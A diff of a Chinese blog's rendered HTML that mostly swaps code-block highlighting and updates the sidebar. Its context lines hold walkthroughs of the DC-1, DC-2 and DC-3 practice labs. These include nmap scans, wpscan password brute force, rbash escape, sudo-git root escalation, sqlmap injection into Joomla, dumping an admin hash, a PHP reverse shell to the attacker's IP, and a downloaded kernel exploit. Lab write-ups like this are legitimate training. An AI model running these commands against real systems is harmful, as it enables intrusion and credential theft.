@@ -424,7 +424,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nmap 192.168.80.155
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap 192.168.80.155
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>发现打开了80端口，用浏览器可以打开网页</p>
@@ -434,7 +434,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nmap -O --osscan-guess 192.168.80.155
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -O --osscan-guess 192.168.80.155
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>也可以借助火狐的扩展插件：<code>Wappalyzer</code>，效果相同。</p>
@@ -492,7 +492,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cat /var/www/sites/default/settings.php
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /var/www/sites/default/settings.php
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>看到第二个 flag</p>
@@ -523,7 +523,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">python -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><!-- 这是一张图片，ocr 内容为： -->
@@ -541,7 +541,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">mysql -udbuser -pR0ck3t
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -udbuser -pR0ck3t
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>show databases;</p>
@@ -633,7 +633,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">find / -perm -u=s -type f 2&gt;/dev/null
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>发现有find命令</p>
@@ -689,7 +689,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nmap -A 192.168.172.131
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A 192.168.172.131
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>开放了80端口，cms框架为WordPress 4.7.10。</p>
@@ -708,7 +708,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nmap 192.168.172.131 -p 1-65535
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap 192.168.172.131 -p 1-65535
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>发现还开放了7744端口</p>
@@ -718,7 +718,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nmap 192.168.172.131 -p 7744 -A
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap 192.168.172.131 -p <span class="m">7744</span> -A
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>发现7744端口运行的是ssh服务</p>
@@ -740,7 +740,7 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">打开hosts文件：
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">打开hosts文件：
 </span></span><span class="line"><span class="cl">vim /etc/hosts
 </span></span><span class="line"><span class="cl">添加：
 </span></span><span class="line"><span class="cl">192.168.172.131 dc-2
@@ -815,7 +815,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cewl http://dc-2 -w passwd.txt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cewl http://dc-2 -w passwd.txt
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>此外， 新建一个用户名的字典，也就是</p>
@@ -837,7 +837,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">wpscan --url http://dc-2 -U users.txt -P passwd.txt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wpscan --url http://dc-2 -U users.txt -P passwd.txt
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>查看结果，找到了tom和Jerry的密码</p>
@@ -885,8 +885,8 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ssh jerry@192.168.172.131 -p 7744
-</span></span><span class="line"><span class="cl">ssh tom@192.168.172.131 -p 7744
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh jerry@192.168.172.131 -p <span class="m">7744</span>
+</span></span><span class="line"><span class="cl">ssh tom@192.168.172.131 -p <span class="m">7744</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>使用tom时登录成功</p>
@@ -898,7 +898,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ls /home/tom/usr/bin
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls /home/tom/usr/bin
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>发现可以使用less和vi命令，这两个命令都可以查看文件内容</p>
@@ -909,7 +909,7 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">less flag3.txt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">less flag3.txt
 </span></span><span class="line"><span class="cl">或
 </span></span><span class="line"><span class="cl">vi flag3.txt
 </span></span></code></pre></td></tr></table>
@@ -934,7 +934,7 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">set shell=/bin/bash
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> <span class="nv">shell</span><span class="o">=</span>/bin/bash
 </span></span><span class="line"><span class="cl">shell
 </span></span></code></pre></td></tr></table>
 </div>
@@ -948,9 +948,9 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cd ..
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> ..
 </span></span><span class="line"><span class="cl">ls 发现tom和jerry两个目录
-</span></span><span class="line"><span class="cl">cd jerry 
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> jerry 
 </span></span><span class="line"><span class="cl">ls 发现flag4.txt就在这里
 </span></span><span class="line"><span class="cl">less flag4.txt 读取
 </span></span></code></pre></td></tr></table>
@@ -987,7 +987,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">BASH_CMDS[a]=/bin/sh;a
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">BASH_CMDS<span class="o">[</span>a<span class="o">]=</span>/bin/sh<span class="p">;</span>a
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>虽然还是无法使用cat这些命令，但是可以使用带斜杠的命令了，升级终端，执行：<code>/bin/bash</code></p>
@@ -1008,8 +1008,8 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">export PATH=$PATH:/bin/
-</span></span><span class="line"><span class="cl">export PATH=$PATH:/usr/bin
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/bin/
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/bin
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>至此，已经完全逃出 rbash 限制，系统重新找回了执行标准命令的能力。</p>
@@ -1021,7 +1021,7 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sudo git -p help config
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo git -p <span class="nb">help</span> config
 </span></span><span class="line"><span class="cl">!/bin/sh
 </span></span></code></pre></td></tr></table>
 </div>
@@ -1031,7 +1031,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">su jerry
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">su jerry
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>重新执行一遍，成功提权到root。</p>
@@ -1071,7 +1071,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">dirb http://192.168.80.159/
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dirb http://192.168.80.159/
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>发现了<code>http://192.168.80.159/administrator/</code>，说明存在管理员登录接口</p>
@@ -1081,7 +1081,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">apt install joomscan
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt install joomscan
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>使用joomscan扫描：</p>
@@ -1090,7 +1090,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">joomscan -u http://192.168.80.159/
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">joomscan -u http://192.168.80.159/
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>得到版本号为<code>3.7.0</code></p>
@@ -1109,7 +1109,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">searchsploit Joomla 3.7.0
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit Joomla 3.7.0
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>Searchsploit</strong> 是一个<strong>离线的漏洞利用代码（Exploit）搜索引擎</strong></p>
@@ -1128,7 +1128,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">searchsploit -x php/webapps/42033.txt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit -x php/webapps/42033.txt
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>查看到返回的文档中有使用sqlmap的注入方法（可以复制到文本编辑器中方便修改）：</p>
@@ -1137,7 +1137,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sqlmap -u &#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span class="o">=</span><span class="m">3</span> --level<span class="o">=</span><span class="m">5</span> --random-agent --dbs -p list<span class="o">[</span>fullordering<span class="o">]</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><!-- 这是一张图片，ocr 内容为： -->
@@ -1162,14 +1162,14 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">sqlmap -u &#34;http://192.168.80.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --batch
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://192.168.80.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span class="o">=</span><span class="m">3</span> --level<span class="o">=</span><span class="m">5</span> --random-agent --dbs -p list<span class="o">[</span>fullordering<span class="o">]</span> --batch
 </span></span><span class="line"><span class="cl">// 看到数据库joomladb
-</span></span><span class="line"><span class="cl">sqlmap -u &#34;http://192.168.80.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering] --batch
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://192.168.80.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span class="o">=</span><span class="m">3</span> --level<span class="o">=</span><span class="m">5</span> --random-agent -D joomladb --tables -p list<span class="o">[</span>fullordering<span class="o">]</span> --batch
 </span></span><span class="line"><span class="cl">// 看到表#__users
-</span></span><span class="line"><span class="cl">sqlmap -u &#34;http://192.168.80.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent -D joomladb -T &#34;#__users&#34; --columns -p list[fullordering]
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://192.168.80.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span class="o">=</span><span class="m">3</span> --level<span class="o">=</span><span class="m">5</span> --random-agent -D joomladb -T <span class="s2">&#34;#__users&#34;</span> --columns -p list<span class="o">[</span>fullordering<span class="o">]</span>
 </span></span><span class="line"><span class="cl">// 注意表名加双引号防止注释，不加--batch，前两个选yes，后面直接全部回车；看到username和password
-</span></span><span class="line"><span class="cl">sqlmap -u &#34;http://192.168.80.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent -D joomladb -T &#34;#__users&#34; -C username,password --dump -p list[fullordering] --batch
-</span></span><span class="line"><span class="cl">// 看到 admin:$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
+</span></span><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://192.168.80.159/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span class="o">=</span><span class="m">3</span> --level<span class="o">=</span><span class="m">5</span> --random-agent -D joomladb -T <span class="s2">&#34;#__users&#34;</span> -C username,password --dump -p list<span class="o">[</span>fullordering<span class="o">]</span> --batch
+</span></span><span class="line"><span class="cl">// 看到 admin:<span class="nv">$2</span>y<span class="nv">$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>成功拿到admin的hash值</p>
@@ -1233,7 +1233,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">nc -lvvp 4444
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvvp <span class="m">4444</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><ol start="2">
@@ -1246,10 +1246,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;?php
-</span></span><span class="line"><span class="cl">system(&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/Kali的IP/4444 0&gt;&amp;1&#39;&#34;);
-</span></span><span class="line"><span class="cl">?&gt;
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">system</span><span class="p">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/Kali的IP/4444 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><ol start="3">
 <li>浏览器访问<code>http://192.168.80.159/templates/beez3/index.php</code>，触发反弹</li>
@@ -1316,7 +1316,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cat /usr/share/exploitdb/exploits/linux/local/39772.txt
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /usr/share/exploitdb/exploits/linux/local/39772.txt
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>给了 exp 的具体GitHub项目地址：</p>
@@ -1336,7 +1336,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cd /var/www/html
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/html
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>用<code>wget</code>将工具下载到目标：</p>
@@ -1345,7 +1345,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>解压：</p>
@@ -1360,13 +1360,13 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">unzip 39772.zip
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">unzip 39772.zip
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">cd 39772
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> <span class="m">39772</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">tar -xvf exploit.tar
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">cd ebpf_mapfd_doubleput_exploit
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ebpf_mapfd_doubleput_exploit
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>编译：</p>
@@ -1375,7 +1375,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">./compile.sh
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./compile.sh
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>运行：</p>
@@ -1384,7 +1384,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">./doubleput
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./doubleput
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>稍等一会，拿到了root权限。</p>
@@ -1405,7 +1405,7 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">cd ../../../../../
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> ../../../../../
 </span></span><span class="line"><span class="cl">ls
 </span></span><span class="line"><span class="cl">cat the-flag.txt
 </span></span></code></pre></td></tr></table>
@@ -1481,6 +1481,32 @@
             
                 
 <article class="">
+    <a href="/p/2.6-2-ctf-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2.6-2 ctf-命令注入 渗透测试报告</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2.6-1-dc4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2.6-1 DC4渗透测试报告</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/2.3-sp-pte%E6%A8%A1%E6%8B%9F%E5%85%A8wp/">
         
         
@@ -1513,32 +1539,6 @@
 
         <div class="article-details">
             <h2 class="article-title">2.2 数字取证</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2.1-%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2.1 综合练习</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/1.31-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">1.31 信息搜集</h2>
         </div>
     </a>
 </article>
@@ -1863,8 +1863,12 @@
         
             
         
-        发表了114篇文章 · 
-        总计185.12k字
+            
+        
+            
+        
+        发表了116篇文章 · 
+        总计187.49k字
     </section>
 
 
